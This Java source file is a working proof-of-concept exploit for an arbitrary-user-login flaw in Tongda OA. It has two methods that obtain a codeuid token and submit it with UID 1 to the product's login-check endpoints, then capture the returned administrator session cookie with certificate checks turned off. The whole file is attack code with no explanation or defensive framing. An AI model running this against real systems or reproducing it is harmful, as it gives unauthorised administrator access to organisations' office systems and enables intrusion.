package poc;

import com.alibaba.fastjson.JSON;
import com.github.kevinsawicki.http.HttpRequest;

public class TongdaOA_AnyUserLogin {
    private String url;//通达OA url地址
    private String path;//漏洞 path地址
    private String cookie;//cookie信息
    private String codeuid;//codeuid参数

    public void setUrl(String url) {
        this.url = url;
    }

    public String getCookie() {
        return cookie;
    }

    //通达OA任意用户登录漏洞poc1
    public boolean POC1(){
        //获取codeuid参数
        path="/ispirit/login_code.php";
        HttpRequest codeuidRequest = HttpRequest.get(url + path).trustAllCerts().trustAllHosts();
        codeuid=JSON.parseObject(codeuidRequest.body()).get("codeuid").toString();

        //获取cookie,当status为1时代表存在漏洞
        path="/logincheck_code.php";
        HttpRequest cookieRequest = HttpRequest.post(url+path)
                .trustAllCerts()
                .trustAllHosts()
                .send("CODEUID="+codeuid+"&UID=1");
        String status=JSON.parseObject(cookieRequest.body()).get("status").toString();
        if (status.equals("1")){
            cookie=cookieRequest.header("Set-Cookie").split(";")[0];
            return true;
        }else {
            return false;
        }
    }

    //通达OA任意用户登录漏洞poc2
    public boolean POC2(){
        //设置path网站目录
        path="/ispirit/login_code.php";
        //获取codeuid
        HttpRequest codeuidRequest = HttpRequest.get(url + path).trustAllHosts().trustAllCerts();
        if (codeuidRequest.code()==200){
            codeuid=JSON.parseObject(codeuidRequest.body()).get("codeuid").toString();
        }else {
            return false;
        }

        //校验codeuid
        path="/general/login_code_scan.php";
        HttpRequest checkCodeuidRequest = HttpRequest.post(url + path)
                .trustAllCerts()
                .trustAllHosts()
                .send("codeuid=" + codeuid + "&source=pc&uid=1&type=confirm&username=admin");
        String status=JSON.parseObject(checkCodeuidRequest.body()).get("status").toString();
        if (status.equals("1")){
            //获取cookie
            path = "/ispirit/login_code_check.php?codeuid="+codeuid;
            HttpRequest cookieRequest=HttpRequest.get(url+path)
                    .trustAllHosts()
                    .trustAllCerts();
            cookie=cookieRequest.header("Set-Cookie").split(";")[0];
            return true;
        }else {
            return false;
        }
    }
}
